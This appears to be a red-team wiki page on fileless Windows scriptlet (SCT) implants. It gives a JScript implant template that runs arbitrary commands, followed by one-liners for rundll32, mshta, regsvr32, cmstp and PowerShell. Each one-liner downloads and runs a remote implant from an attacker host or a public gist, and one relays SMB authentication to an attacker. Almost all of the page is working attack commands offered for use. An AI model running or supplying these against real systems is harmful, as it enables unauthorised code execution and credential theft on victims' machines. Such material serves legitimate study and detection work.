---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1117
  - windows
credits:
  - bohops
---
# Scriptlet

Fileless scriptlet implant template.

```xml
<?XML version="1.0"?>
<scriptlet>
<registration 
    progid="Updater"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("<commands>");    
        ]]>
</script>
</registration>
</scriptlet>
```

## 01 - Command Prompt

### 1.1 - `rundll32.exe`

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http[s]://<attacker_IP>/implant.sct");window.close();
```

### 1.2 - `mshta.exe`

```
mshta javascript:o=GetObject("script:https://gist.githubusercontent.com/NickTyrer/0598b60112eaafe6d07789f7964290d5/raw/7717cfad109fc15a6796dd9119b0267f7a4df3fd/power.sct");o.Exec();close();
```

### 1.3 - `regsvr32.exe`

Execute a SCT dropper implant.

```
C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
```

Execute a fileless implant.

```
C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll

C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\implant.sct scrobj.dll
```

Execute command to perform SMB authentication relay.

```
C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
```

### 1.4 - `cmstp.exe`

Fileless scriptlet implant template

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/implant.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Yay"
ShortSvcName="Yay"
```

Execute implant.

```
C:\> cmstp.exe /ni /s implant.inf
```

Execute fileless implant.

```
C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
```

## 02 - PowerShell

```
PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http[s]://<attacker_IP>/implant.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
```

Another PowerShell Assembly Reflection SCT Code Execution Example w/ 'Microsoft.VisualBasic.Interaction' -

```
PS C:\> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http[s]://<attacker_IP>/implant.sct').Exec(0)
```

---
## References

### Backlinks

- [[DLL Execution]]

### LOLBAS

- [LOLBAS: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)

- [LOLBAS: cmstp](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/)

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)

### Red Team Notes

- [Red Team Notes: Code Execution - Regsvr32](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo)

- [Red Team Notes: CMSTP](https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution)